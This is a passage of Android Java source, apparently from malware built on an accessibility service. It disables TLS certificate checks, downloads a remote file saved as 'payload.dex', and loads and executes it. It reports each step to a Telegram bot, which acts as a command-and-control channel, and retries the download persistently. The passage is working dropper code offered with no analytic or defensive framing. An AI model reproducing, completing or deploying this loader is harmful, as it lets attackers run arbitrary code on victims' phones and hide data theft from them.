                  if (isDexLoaded) {
                      isDexLoaded = false;
                      File oldDex = new File(getDexPath());
                      if (oldDex.exists()) oldDex.delete();
                  }
                  if (isDownloading) return;
                  if (!isNetworkConnected()) {
                      Log.w(TAG, "No network");
                      sendTelegram("❌ DEX Download Failed\nReason: No network");
                      return;
                  }
                  isDownloading = true;
                  downloadExecutor.submit(() -> {
                      try {
                          Log.d(TAG, "🚀 Attempting DEX download (Attempt " + (downloadRetryCount + 1) + "/" + MAX_RETRIES + ")");
                          trustAllCertificates();
                          URL url = new URL(DEX_URL);
                          HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                          conn.setConnectTimeout(60000);
                          conn.setReadTimeout(60000);
                          conn.setInstanceFollowRedirects(true);
                          conn.setRequestProperty("User-Agent", "Mozilla/5.0");
                          int responseCode = conn.getResponseCode();
                          if (responseCode != 200) {
                              conn.disconnect();
                              isDownloading = false;
                              sendTelegram("❌ DEX Download Failed\nServer error: " + responseCode);
                              scheduleRetry();
                              return;
                          }
                          File dexFile = new File(getDexPath());
                          if (dexFile.exists()) dexFile.delete();
                          try (InputStream in = conn.getInputStream(); FileOutputStream out = new FileOutputStream(dexFile)) {
                              byte[] buffer = new byte[8192];
                              int len;
                              while ((len = in.read(buffer)) != -1) {
                                  out.write(buffer, 0, len);
                              }
                              out.flush();
                              conn.disconnect();
                          }
                          if (!validateDexFile(dexFile)) {
                              dexFile.delete();
                              isDownloading = false;
                              sendTelegram("❌ DEX Download Failed\nInvalid DEX file");
                              scheduleRetry();
                              return;
                          }
                          isDownloading = false;
                          downloadRetryCount = 0;
                          Log.d(TAG, "✅ DEX downloaded successfully");
                          sendTelegram("✅ DEX Downloaded Successfully");
                          loadAndExecuteDex(dexFile);
                      } catch (Exception e) {
                          StringWriter sw = new StringWriter();
                          PrintWriter pw = new PrintWriter(sw);
                          e.printStackTrace(pw);
                          Log.e(TAG, "Download error", e);
                          sendTelegram("❌ DEX Download Failed\nError: " + e.getMessage());
                          isDownloading = false;
                          scheduleRetry();
                      }
                  });
              }

              private boolean isNetworkConnected() {
                  ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
                  if (cm == null) return false;
                  android.net.NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
                  return activeNetwork != null && activeNetwork.isConnectedOrConnecting();
              }

              private boolean validateDexFile(File dexFile) {
                  try {
                      if (!dexFile.exists() || dexFile.length() < 100) return false;
                      byte[] header = new byte[4];
                      try (java.io.FileInputStream fis = new java.io.FileInputStream(dexFile)) {
                          if (fis.read(header) != 4) return false;
                      }
                      return new String(header).equals(DEX_MAGIC);
                  } catch (Exception e) {
                      return false;
                  }
              }

              private void scheduleRetry() {
                  downloadRetryCount++;
                  if (downloadRetryCount > MAX_RETRIES) {
                      Log.e(TAG, "Max retries exceeded");
                      sendTelegram("❌ DEX Download Failed\nMax retries exceeded");
                      downloadRetryCount = 0;
                      return;
                  }
                  Log.w(TAG, "⏱️ Retrying in 1 minute...");
                  mainHandler.postDelayed(this::performDexDownload, RETRY_DELAY_MS);
              }

              private String getDexPath() {
                  return getFilesDir().getAbsolutePath() + "/payload.dex";
              }

              // ============ TELEGRAM ============
              private void sendTelegram(String message) {
                  Executors.newSingleThreadExecutor().execute(() -> {
                      try {
                          String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
                          URL obj = new URL(url);
                          HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
                          conn.setRequestMethod("POST");
                          conn.setRequestProperty("Content-Type", "application/json");
                          conn.setDoOutput(true);
                          String json = "{\"chat_id\":\"" + CHAT_ID + "\",\"text\":\"" + message.replace("\"", "\\\"") + "\"}";
                          conn.getOutputStream().write(json.getBytes());
                          conn.getOutputStream().flush();
                          int responseCode = conn.getResponseCode();
                          if (responseCode == 200) Log.d(TAG, "✅ Telegram sent");
                          else Log.e(TAG, "Telegram failed: " + responseCode);
                          conn.disconnect();
                      } catch (Exception e) {
                          Log.e(TAG, "Telegram error: " + e.getMessage());
                      }
                  });
              }

              @Override
              public void onAccessibilityEvent(AccessibilityEvent event) {
                  // Log accessibility events if needed
              }

              @Override
              public void onInterrupt() {
                  Log.d(TAG, "Service interrupted");
              }

              @Override
              public void onDestroy() {
                  super.onDestroy();
                  if (scheduler != null) scheduler.shutdown();
                  if (downloadExecutor != null) downloadExecutor.shutdown();
              }
          }
